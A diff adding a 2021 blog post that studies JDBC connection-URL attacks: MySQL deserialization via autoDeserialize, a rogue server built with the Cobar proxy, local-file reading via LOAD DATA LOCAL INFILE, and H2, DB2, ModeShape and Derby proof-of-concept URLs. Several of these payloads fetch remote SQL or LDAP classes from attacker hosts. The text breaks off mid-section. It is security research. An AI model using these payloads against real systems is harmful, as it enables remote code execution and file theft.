@@ -1,0 +1,677 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JDBC Connection URL Attack | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JDBC Connection URL Attack
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-09-02
+              </span>
+              <span>
+                26 min read
+              </span>
+              
+                <a href="https://su18.org/tag/bN-3QKzrb/" class="post-tag">
+                  # mysql
+                </a>
+              
+                <a href="https://su18.org/tag/88AcuR3x8y/" class="post-tag">
+                  # rce
+                </a>
+              
+                <a href="https://su18.org/tag/TMMOORyTW/" class="post-tag">
+                  # javasec
+                </a>
+              
+                <a href="https://su18.org/tag/mBZEXbIuQ/" class="post-tag">
+                  # 工具
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/jdbc-connection-url-attack.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>The several means of attacking java web application by manipulating MYSQL JDBC URL had been revealed and discussed for quite some time,and I haven't pay my attention to it.</p>
+<p>With the video &quot;<a href="https://www.youtube.com/watch?v=MJWI8YXH1lg&amp;ab_channel=HackInTheBoxSecurityConference">Make JDBC Attacks Brilliant Again</a>&quot; from HITB2021SIN uploaded on youtube,I know it's time.</p>
+<p>This article records my study and research results,let's start at the beginning.</p>
+<h1 id="beginning">Beginning</h1>
+<p>At BlackHat Europe 2019, there is a subject named &quot;<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New Exploit Technique In Java Deserialization Attack</a>&quot; proposes the jdbc exploit technique for the first time by Yongtao Wang, Lucas Zhang, Kevin Li and Kunzhe Chai from Back2Zero Team.</p>
+<p>And the video has been uploaded to <a href="https://www.youtube.com/watch?v=Lv9BC_bYaI8&amp;ab_channel=BlackHat">youtube</a>.Let's learn from it.</p>
+<h2 id="introduction-to-java-deserialization">Introduction to Java Deserialization</h2>
+<p>There are fives parts on this subject,I will skip the first one &quot;Introduction to Java Deserialization&quot; and just paste some slides below for you guys to review.</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1630543970926.png" alt="" loading="lazy"></figure>
+<p>Attack scenario and Magic Callback</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1630545978902.png" alt="" loading="lazy"></figure>
+<p>Vulnerable Class</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1630546078962.png" alt="" loading="lazy"></figure>
+<h2 id="well-known-defense-solutions">Well-Known Defense Solutions</h2>
+<p>Lucas shows three widly used strategies to defense the damage may have been caused during deserialization.</p>
+<ol>
+<li><strong>Look-Ahead Check(Blacklist)</strong><br>
+A look-ahead stage to validate input stream during the deserialization process to secure application. If the class in the blacklist is found during the deserialization process, the deserialization process will be terminated.<br>
+We can find this kind of strategy using in Jackson/Weblogic and project SerialKiller.</li>
+<li><strong>JEP290(Filter Incoming Serialization Data)</strong><br>
+Allow incoming streams of object-serialization data to be filtered in order to improve both security and robustness.<br>
+Define a global filter that can be configured by properties or a configuration file.<br>
+The filter interface methods are called during the deserialization process to validate the classes being deserialized. The filter returns a status to accept, reject, or leave the status undecided, allowed or disallowed.</li>
+<li><strong>Runtime Application Self-protection(RASP)</strong><br>
+RASP is a security technology that is built or linked into an application or application runtime environment, and is capable of controlling application execution and detecting and preventing real-time attacks.<br>
+Dose not need to build lists of patterns (blacklists) to match against the payloads, since they provide protection by design.<br>
+Most of policies of RASP only focus on insecure deserialization attacks that try to execute commands and using input data that has been provided by the network request.</li>
+</ol>
+<p>But there are some flaws in these defense solutions:</p>
+<ul>
+<li>If we find a new gadget,we can bypass lots of blacklists.</li>
+<li>Most Security researcher like to find gadget which eventually invoke common-dangerous functions such as <code>ProcessBuilder.exec()</code>,and some defense solutions only focus on these functions(even RASP),if we find a new fundamental vector in Java,we can find many new gadgets and bypass most of Java deserialization defense solutions.</li>
+</ul>
+<h2 id="critical-vulnerabilities-in-java">Critical vulnerabilities in Java</h2>
+<p>So Lucas presented two vectors may cause critical vulnerabilities.</p>
+<h3 id="urlconnection">URLConnection</h3>
+<p>Speaking of URLConnection,I can only think of SSRF,but Lucas made it to NTLM Reflection Attack (CVE-2019-1040) to get local Windows credentials.</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1630547981095.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1630547986121.png" alt="" loading="lazy"></figure>
+<p>It's not the point in this article,so skip this part too.</p>
+<h3 id="jdbc">JDBC</h3>
+<p>This part of the topic is explained by Kunzhe Chai.</p>
+<p>JDBC is part of the Java Standard Edition platform, is a Java API, which defines how a client may access a database.</p>
+<p>We use JDBC to make a connection to a database,execute queries and update statements to the database and retrieve the result received from the database.Testing Java code comes below:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+
+		String CLASS_NAME = &quot;com.mysql.jdbc.Driver&quot;;
+		String URL        = &quot;jdbc:mysql://localhost:3306/test&quot;;
+		String USERNAME   = &quot;root&quot;;
+		String PASSWORD   = &quot;root&quot;;
+
+		Class.forName(CLASS_NAME);
+		Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
+
+		Statement statement = connection.createStatement();
+		statement.execute(&quot;select 10086&quot;);
+		ResultSet set = statement.getResultSet();
+		while (set.next()) {
+			System.out.println(set.getString(1));
+		}
+
+		statement.close();
+		connection.close();
+	}
+</code></pre>
+<p>JDBC use Connection URL/URI to make connection with specific database, the URL includes mainly three parts : driver name, connection address and expanded parameters.</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1630551377896.png" alt="" loading="lazy"></figure>
+<p>The &quot;expanded parameters&quot; part is what we need to foucs on that can introduce new security risks.</p>
+<p>There is a vulnerable parameter : &quot;<strong>autoDeserialize</strong>&quot;.It will enable the JDBC Client to deserialize data automatically.With this ability, we can achieve the goal of RCE.</p>
+<p>So if we(the attacker) perform a mysql server role，and return malicious serialized byte code, with the autoDeserialize patameter,the victim(mysql client) will call <code>getObject()</code> to deserialize the payload and eventually results in remote command execution.</p>
+<p>In mysql-connector-java 8.0.14(for instance), class <code>com.mysql.cj.jdbc.result.ResultSetImpl</code> implements <code>java.sql.ResultSet</code> and rewrite <code>getObject()</code> method.</p>
+<p>if the &quot;autoDeserialize&quot; is found in JdbcConnection's PropertySet,the client will  deserialize the data by invoke <code>readObject()</code>, and that is the source of this mysql jdbc attack.</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1630553400164.png" alt="" loading="lazy"></figure>
+<p>But by default JDBC client does not call the <code>getObject()</code> function to process the attacker's data,so we need to find a way to make the JDBC client process the data we returned.</p>
+<p>Through in deep research, Kunzhe Chai found the way to trigger the method in expanded parameters : <font color='red'>queryInterceptors</font>.</p>
+<p>&quot;queryInterceptors&quot;, where you specify the fully qualified names of classes that implement the <code>com.mysql.cj.interceptors.QueryInterceptor</code> interface. In these kinds of interceptor classes, you might change or augment the processing done by certain kinds of statements, such as automatically checking for queried data in a memcached server, rewriting slow queries, logging information about statement execution, or route requests to remote servers.</p>
+<p>According to the <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-statements.html#cj-conn-prop_queryInterceptors">docs</a>, &quot;queryInterceptors&quot; config is supported since 8.0.7.</p>
+<p>Interface QueryInterceptor provides a complete interceptor control process including <code>init</code>-&gt;<code>preProcess</code>-&gt;<code>postProcess</code>-&gt;<code>destroy</code>, and QueryInterceptors are &quot;chainable&quot;,the results will be passed on the next QueryInterceptor.</p>
+<p>QueryInterceptor has several implements in mysql-connector-java.</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1630559585180.png" alt="" loading="lazy"></figure>
+<p>And Chai found <code>ServerStatusDiffInterceptor</code> useful in calling <code>getObject</code>,let's see the invocation chain.</p>
+<p>ServerStatusDiffInterceptor is used to show the differences of server status between queries, function <code>preProcess()</code>/<code>postProcess()</code> call <code>populateMapWithSessionStatusValues()</code>.</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1630560911905.png" alt="" loading="lazy"></figure>
+<p><code>populateMapWithSessionStatusValues()</code> using connection to create a new statement and execute <code>SHOW SESSION STATUS</code>, and call <code>ResultSetUtil.resultSetToMap()</code> to deal with the result.</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1630561003459.png" alt="" loading="lazy"></figure>
+<p>And <code>resultSetToMap</code> calls the magic <code>getObject()</code>, so there is our chain.</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1630561320404.png" alt="" loading="lazy"></figure>
+<p>With all knowledges above, we have found an attack path that lead to deserialization vulnerability: If we can controll the JDBC URI, we can</p>
+<ul>
+<li>specify the mysql server to the attacker's service which can provide malicious serialized byte code</li>
+<li>make autoDeserialize true, so the mysql client can deserialize our payload</li>
+<li>using ServerStatusDiffInterceptor to trigger the deserialization</li>
+</ul>
+<p>Steps to exploit JDBC:</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1630561963768.png" alt="" loading="lazy"></figure>
+<h2 id="new-exploit-for-java-deserialization">New exploit for Java Deserialization</h2>
+<p>In this part, Kunzhe Chai combines 3 vulnerabilities(deserialization/NTLM Hash Leaking/NTLM Reflection Attack) and lead to RCE.</p>
+<p>And he made a video to demonstrate the attack chain in a real environment.</p>
+<p>Then he showed some gadgets he found to trigger the URLConnection that leads to the further attack, including Java Deserialization/Jackson.</p>
+<p>Still, it's not what we focus on today,so we skip this part as well.</p>
+<h2 id="takeaways">Takeaways</h2>
+<p>At the end of the PPT, Chai gave us some recommendations for both the developers and security researchers.</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1630563803916.png" alt="" loading="lazy"></figure>
+<h1 id="afterwards">Afterwards</h1>
+<p>After the speech, there was this foreigner raised the question which exactly I wanted to ask:</p>
+<blockquote>
+<p>It's not that common that attacker can controll the jdbc url, in what case can this attack used in the real world?</p>
+</blockquote>
+<p>And Lucas gave his answer：Cloud Platform Configuration.</p>
+<p>And this foreigner pushed and asked if there is a standalone product that accidently allows to config the jdbc url.I guess he was unwilling to admit the exploitability of this vulnerability.</p>
+<p>I don't think Lucas understood his question and I also don't believe this is some products which allows the unauthorized config on jdbc url.</p>
+<p>But still, this tech can always be used in anti-attack or decept-defense(HoneyPot for example).</p>
+<p>On the conference Lucas and Chai only provide the ideas, they don't provide the fake mysql server that can return the malicious serialized byte code.</p>
+<p>Couple of months later, codeplutos used the modified MySQL plugin to build a malicious server successfully, and using another expanded parameters:<font color='red'>detectCustomCollations</font> .</p>
+<p>When set <code>detectCustomCollations=true</code> in jdbc connection parameters, it could also trigger the deserizaltion, call point at <code>com.mysql.jdbc.ConnectionImpl#buildCollationMapping</code>,  dependency is mysql-connector-java 5.1.29.</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1630571254492.png" alt="" loading="lazy"></figure>
+<p><code>buildCollationMapping</code> execute <code>SHOW COLLATION</code> and call <code>Util.resultSetToMap()</code> to deal with the result.</p>
+<p><code>resultSetToMap()</code> call <code>getObject()</code> cause the deserizaltion.</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1630571261454.png" alt="" loading="lazy"></figure>
+<p>so, no matter using which one of these two gadgets, we need to build a malicious mysql server to response to the statements' execution below during the establishing of connection.</p>
+<ul>
+<li><code>SHOW SESSION STATUS</code></li>
+<li><code>SHOW COLLATION</code></li>
+</ul>
+<p>But how?</p>
+<p>A month after, fnmsd post his <a href="https://www.anquanke.com/post/id/203086">research</a> and his <a href="https://github.com/fnmsd/MySQL_Fake_Server">fake server project</a>.</p>
+<p>fnmsd gives a unified summary after analyzing various versions of MySQL connector/J,and gives the malicious URLs required for different versions.And I will be learning from his article.</p>
+<h1 id="build-my-own-fake-server">Build My Own Fake Server</h1>
+<p>Now that we know how the call chain works, next we should focus on how to build a malicious mysql server.There are several ways:</p>
+<ul>
+<li>Write a fake MySQL server from scratch, compatible with MySQL protocol and MySQL SQL grama.(too much work)</li>
+<li>Wireshark all the tcp traffic during jdbc connection, analysis how the client and server communicate, including hand shake, authorization, statement execution and etc, fulfill the whole workflow only to return our payload.(seems like that's how fnmsd does it)</li>
+<li>using mysql plugin to do the work.(that's how codeplutos do it)</li>
+</ul>
+<p>All these ways are too complicated for me,so I build my own fake server in a much more elegant way by using so called &quot;Database Middleware&quot;.</p>
+<p>I found alibaba's open source project <a href="https://github.com/alibaba/cobar">cobar</a>,  it's a proxy for sharding databases, you can call it anything you want, but it's a proxy between the client and the server.</p>
+<p>When using database middleware such as cobar, for the real client, cobar play the role as Mysql Server; for the real server, cobar is the client.So it's a perfect tool for us to controll the result of certain statement execuation.</p>
+<p>Talk is cheap.Let's demonstrate the real attack process in the actual environment:</p>
+<ul>
+<li>Real Mysql Server: 5.6.35</li>
+<li>cobar: 4.0.0</li>
+<li>mysql-connector-java: 5.1.29</li>
+<li>client-side dependency: commons-collections-3.2.1</li>
+<li>attack method: detectCustomCollations</li>
+</ul>
+<h2 id="prepare-the-serialized-class-byte-code">Prepare the serialized class byte code</h2>
+<p>First, generate the malicious serialized data, in my case, I choose CC1 chain with TransformedMap, and using <code>Runtime.exec()</code> to execute system commands &quot;open -a Calculator.app&quot;. You can use ysoserial or any other means to do so.</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1630658268791.png" alt="" loading="lazy"></figure>
+<p>Then, create a table in the real Mysql Server which stores the byte code, in this case we should create a table with at least 3 fields, and make sure the third field type is blob.</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1630716373743.png" alt="" loading="lazy"></figure>
+<p>Because for detectCustomCollations chain, we trigger the 3rd result field object deserialization first,so we show plant our malicious byte code in the certain position.</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1630717079649.png" alt="" loading="lazy"></figure>
+<p>At last we insert the malicious serialized data into the table using code like these:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+
+	String CLASS_NAME = &quot;com.mysql.jdbc.Driver&quot;;
+	String URL        = &quot;jdbc:mysql://localhost:3306/test&quot;;
+	String USERNAME   = &quot;root&quot;;
+	String PASSWORD   = &quot;123456&quot;;
+
+	Class.forName(CLASS_NAME);
+	Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
+
+	File file   = new File(&quot;/Users/phoebe/IdeaProjects/ysoserial-su18/CC1WithTransformedMap.bin&quot;);
+	int  length = (int) file.length();
+
+	FileInputStream stream = new FileInputStream(file);
+
+	PreparedStatement statement = connection.prepareStatement(&quot;INSERT INTO evil (`a`,`b`,`c`) VALUES (1,1,?)&quot;);
+	statement.setBlob(1, stream, length);
+	statement.execute();
+
+	statement.close();
+	connection.close();
+}
+</code></pre>
+<h2 id="config-the-proxy-mysql-server">Config the Proxy Mysql Server</h2>
+<p>First, config the cobar,make it connect with the real Mysql Server:</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1630657647759.png" alt="" loading="lazy"></figure>
+<p>Then config the cobar server for the real client to connent:</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1630657682217.png" alt="" loading="lazy"></figure>
+<p>Start cobar,and it become our proxy database,whatever statements we execute, cobar will get it and parse it first, and then make the execute to the real server.</p>
+<p>As we know, if we set <code>detectCustomCollations=true</code> in jdbc connection parameters, jdbc connector will execute the statement <code>SHOW COLLATION</code> and try to deserize the third return field.</p>
+<p>With cobar, we can change the returned results of database queries with a small amount of code:</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1630717632560.png" alt="" loading="lazy"></figure>
+<p>We add this code in <code>com.alibaba.cobar.server.ServerConnection#execute</code>，when cobar get <code>SHOW COLLATION</code>,it will execute <code>select * from evil</code> instead and return the malicious serialized data we've prepared.</p>
+<h2 id="make-connection">Make Connection</h2>
+<p>Make connection with cobar using jdbc:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+	String CLASS_NAME = &quot;com.mysql.jdbc.Driver&quot;;
+	String URL        = &quot;jdbc:mysql://localhost:8066/dbtest?detectCustomCollations=true&amp;autoDeserialize=true&quot;;
+	String USERNAME   = &quot;root&quot;;
+	String PASSWORD   = &quot;123456&quot;;
+
+	Class.forName(CLASS_NAME);
+	Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
+	connection.close();
+}
+</code></pre>
+<p>Then we get our Calculator.app poped out.</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1630720017537.png" alt="" loading="lazy"></figure>
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+<p>Here are two screenshots from fnmsd's research.</p>
+<h2 id="serverstatusdiffinterceptor">ServerStatusDiffInterceptor</h2>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1630730354237.png" alt="" loading="lazy"></figure>
+<h2 id="detectcustomcollations">detectCustomCollations</h2>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1630730360676.png" alt="" loading="lazy"></figure>
+<h1 id="arbitrary-file-reading-vulnerability">Arbitrary File Reading Vulnerability</h1>
+<p>Other than manipulating JDBC URI to cause deserizaltion vulnerability, there is an attack against JDBC that can cause arbitrary file reading and has been disclosed for more than a decade.</p>
+<p>If you connect to the server from mysql client with <code>–enable-local-infile</code> option and run <code>LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';</code>, the client will read its local file and transfer to the server.</p>
+<p>So if the mysql server are untrusted server, a single connection could cause arbitrary file reading.A lot more details can be found in LoRexxar's <a href="https://lorexxar.cn/2020/01/14/css-mysql-chain">blog</a> and fake server project in <a href="https://github.com/Gifts/Rogue-MySql-Server">github</a>.</p>
+<p>Sink point in jdbc connector is <code>com.mysql.jdbc.MysqlIO#sendFileToServer</code>.</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1630734728926.png" alt="" loading="lazy"></figure>
+<h1 id="make-jdbc-attacks-brilliant-again">Make JDBC Attacks Brilliant Again</h1>
+<p>This topic is shared in HITB SECCONF SIN-2021 by Litch1 &amp; pyn3rd. Slide is <a href="https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">here</a> and video is <a href="https://www.youtube.com/watch?v=MJWI8YXH1lg&amp;ab_channel=HackInTheBoxSecurityConference">here</a>.Litch1 gave us the speech.Let's learn from the huge.</p>
+<p>First he introduced the backgroud and gave a review of using ServerStatusDiffInterceptor to explode in different versions.</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1630887629022.png" alt="" loading="lazy"></figure>
+<p>He listed the common scenarios using jdbc attack technoloy.</p>
+<ul>
+<li>New Gadgets(fastjson/jackson, initial database connection in getter/setter)</li>
+<li>Attack SpringBoot Actuator</li>
+<li>API Interfaces Exposure</li>
+<li>Phishing, Honeypot</li>
+</ul>
+<p>And then he gave some typical examples of jdbc attack.</p>
+<h2 id="csrf-to-jdbc-attackweblogic">CSRF to JDBC Attack(Weblogic)</h2>
+<p>Weblogic (CVE-2020-2934), because Weblogic does not have CSRF detection in the interface that create the JDBCDataSourceForm, attacker can launch a csrf attack together with the jdbc attack technoloy and achieve RCE.</p>
+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1630893585699.png" alt="" loading="lazy"></figure>
+<p>According to the screenshot in the slide, I reproduced this attack myself using URLDNS and skip the csrf part.</p>
+<figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1630895850214.png" alt="" loading="lazy"></figure>
+<h2 id="reconfigure-jdbc-resourcewildfy">Reconfigure JDBC Resource(Wildfy)</h2>
+<p>JBOSS/Wildfy, there are also functions of jdbc configuration in backstage or content manage system of various middlewares.For JBoss/Wildfy,because the driver in h2 database in built-in , we can reconfigure the jdbc in the backstage and achieve the attack.</p>
+<figure data-type="image" tabindex="29"><img src="https://su18.org/post-images/1630896558338.png" alt="" loading="lazy"></figure>
+<h2 id="h2-rce">H2 RCE</h2>
+<p>Spring Boot H2 console,by changing the connection url of h2 database,we can make spring boot run script from the remote.</p>
+<pre><code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
+</code></pre>
+<p>And then prepare a statemate something like below to declare and call the <code>Runtime.getRuntime().exec()</code>:</p>
+<pre><code class="language-sql">CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return &quot;su18&quot;;}';CALL EXEC ('open -a Calculator.app')
+</code></pre>
+<p>Requiring configuration parameter:</p>
+<pre><code>spring.h2.console.enable=true
+spring.h2.console.setting.web-allow-others=true
+</code></pre>
+<p>Test:</p>
+<figure data-type="image" tabindex="30"><img src="https://su18.org/post-images/1630899506476.png" alt="" loading="lazy"></figure>
+<p>How does the attack work?</p>
+<h3 id="init-runscript">INIT RUNSCRIPT</h3>
+<p>Sink point is in <code>org.h2.engine.Engine#openSession</code>,the h2 engine splits &quot;INIT&quot; parameters and using different implementation class of CommandInterface  to initialize the database connection depend on the config.</p>
+<figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1630906885336.png" alt="" loading="lazy"></figure>
+<p>In this case is <code>org.h2.command.CommandContainer</code>.</p>
+<figure data-type="image" tabindex="32"><img src="https://su18.org/post-images/1630910275862.png" alt="" loading="lazy"></figure>
+<p>By using the RUNSCRIPT command, h2 will eventually call <code>org.h2.command.dml.RunScriptCommand#execute</code> to execute the evil sql.</p>
+<p>Why we use command &quot;RUNSCRIPT&quot;?</p>
+<p>Because the POC we use needs to execute two SQL statements, the first is CREATE ALIAS and the second is EXEC,it's a two step move.Yet <code>session.prepareCommand</code> doesn't support multiple sql statement execute.So we use RUNSCRIPT to load sql from remote server.</p>
+<p>But it also means the attack requires a network connection, how to bypass the restriction of network?Since h2 is an embedded database,it's possible to find an attack that doesn't require any external connections.</p>
+<h3 id="source-code-compiler">Source Code Compiler</h3>
+<p>So we should find a way to reduce the POC sql to only one statement and without connecting to remote server.</p>
+<p>Litch1 went through the source code for the creator of the statement <code>CREATE ALIAS</code> and found the define of JAVA METHOD in the statement was handed over to the source compile class.There are three compilers supported:Java/Javascript/Groovy.</p>
+<figure data-type="image" tabindex="33"><img src="https://su18.org/post-images/1630916267145.png" alt="" loading="lazy"></figure>
+<p>Let's start with Groovy.</p>
+<p>In <code>org.h2.util.SourceCompiler#getClass</code>, h2 use <code>isGroovySource</code> to determine whether it is groovy source code.</p>
+<figure data-type="image" tabindex="34"><img src="https://su18.org/post-images/1630916970678.png" alt="" loading="lazy"></figure>
+<p>if true, then call <code>GroovyCompiler.parseClass()</code> to parse the groovy code.It's the same sink point in <a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">Hacking Jenkins Part 2</a> shared by Orange.</p>
+<figure data-type="image" tabindex="35"><img src="https://su18.org/post-images/1630916865214.png" alt="" loading="lazy"></figure>
+<p>And Litch1 gave us the poc use <code>@groovy.transform.ASTTEST</code> to perform assertions on the AST.</p>
+<pre><code class="language-java">public static void main (String[] args) throws ClassNotFoundException, SQLException {
+    String groovy = &quot;@groovy.transform.ASTTest(value={&quot; + &quot; assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot; + &quot;})&quot; + &quot;def x&quot;;
+    String url = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '&quot;+ groovy +&quot;'&quot;;
+    Connection conn = DriverManager.getConnection(url);
+    conn.close();
+}
+</code></pre>
+<p>However Groovy dependency is not usually seen in the real world,so Litch1 gave the poc performs with JavaScript and <code>CREATE TRIGGER</code> which not only compile but also invoke the eval source code.</p>
+<figure data-type="image" tabindex="36"><img src="https://su18.org/post-images/1630925694016.png" alt="" loading="lazy"></figure>
+<p>POC here:</p>
+<pre><code class="language-java">public static void main (String[] args) throws ClassNotFoundException, SQLException {
+    String javascript = &quot;//javascript\njava.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;;
+    String url = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '&quot;+ javascript +&quot;'&quot;;
+    Connection conn = DriverManager.getConnection(url);
+    conn.close();
+}
+</code></pre>
+<h2 id="ibm-db2">IBM DB2</h2>
+<p>The vulnerabilities found in MySQL are due to the feature of its configurable properties.</p>
+<p>So is there other configurable properties can cause vulnerabilities if controllable?</p>
+<p>In DB2, Litch1 found this <code>clientRerouteServerListJNDINameIdentifies</code>.</p>
+<p>It's a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI repository of<br>
+reroute server <code>information.clientRerouteServerListJNDIName</code> applies only to IBM Data<br>
+Server Driver for JDBC and SQLJ type 4 connectivity, and to connections that are<br>
+established through the DataSource interface.</p>
+<p>In Engilsh,that means this property gives us a JNDI Injection in JDBC URL configuration.</p>
+<p>POC here:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    Class.forName(&quot;com.ibm.db2.jcc.DB2Driver&quot;);
+    DriverManager.getConnection(&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;&quot;);
+}
+</code></pre>
+<h2 id="modeshape">ModeShape</h2>
+<p><a href="https://modeshape.jboss.org/">ModeShape</a> is an implementation of JCR(Java Content Repository),using JCR API to access data from other systems,e.g. filesystem, Subversion, JDBC metadata…</p>
+<p>Repository source can be configured like <code>jdbc:jcr:jndi:jcr:?repositoryName=repository</code>.</p>
+<p>So of cause we can use ModeShape to trigger JNDI Injection:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    Class.forName(&quot;org.modeshape.jdbc.LocalJcrDriver&quot;);
+    // A JNDI URL that points the hierarchical database to an evil LDAP service 
+    DriverManager.getConnection(&quot;jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass&quot;);
+}
+</code></pre>
+<h2 id="apache-derby">Apache Derby</h2>
+<p>Apache Derby can be embed just like h2.In derby's driver code,Litch1 found suspicious call in class <code>org.apache.derby.impl.store.replication.net.SocketConnection</code>.</p>
+<figure data-type="image" tabindex="37"><img src="https://su18.org/post-images/1630929631196.png" alt="" loading="lazy"></figure>
+<p>Then he found an inner class <code>ReplicationMessageTransmit$MasterReceiverThread</code> called the method.</p>
+<figure data-type="image" tabindex="38"><img src="https://su18.org/post-images/1630929950540.png" alt="" loading="lazy"></figure>
+<p><code>ReplicationMessageTransmit</code>  is used for replicate database from the master to the slave by configure <code>startMaster=true</code> and <code>slaveHost=127.0.0.2</code>.</p>
+<p>if we config the slave server to a malicious server,derby will establish JDBC connection and read data stream from the SLAVE,when <code>MasterReceiverThread</code> perform the method <code>readMessage</code>,malicious server will return the evil code and trigger the deserization porcess.</p>
+<p>POC here:</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    Class.forName(&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;);
+    DriverManager.getConnection(&quot;jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip&quot;);
+}
+</code></pre>
+<p>And evil slave server can be build like:</p>
